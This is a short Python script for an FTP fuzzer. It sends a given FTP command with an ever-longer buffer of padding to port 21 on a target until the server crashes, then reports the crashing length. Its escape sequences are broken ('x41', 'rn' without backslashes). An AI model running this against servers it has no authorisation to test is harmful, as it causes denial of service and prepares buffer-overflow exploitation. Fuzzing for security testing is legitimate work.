#simple ftp fuzzer
#requires user to specify the target and the command to fuzz as arguments
#example: python pyftpfuzz.py 127.0.0.1 USER
#commands are not case sensitive since they are cast to upper
import sys, socket
from time import sleep
 
target = sys.argv[1] # sets target to first cli arg
cmd = sys.argv[2] #sets cmd to the second cli arg
#create string of 50 A's 'x41'
buff = 'x41'*50
 
#loop through sending buffer
while True:
  # setup exception handling so we can track when it crashes
  try:
    #connect to target ftp server
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target,21))
    s.recv(1024)
 
    print "Sending buffer with length: "+str(len(buff))
    s.send(cmd+" "+buff+"rn")
    s.close()
    sleep(1)
    #increase buffer and try again
    buff = buff + 'x41'*50
 
  except: #if the server crashes, print out the current buffer length
    print "[+] Crash occured with buffer length: "+str(len(buff)-50)
    sys.exit()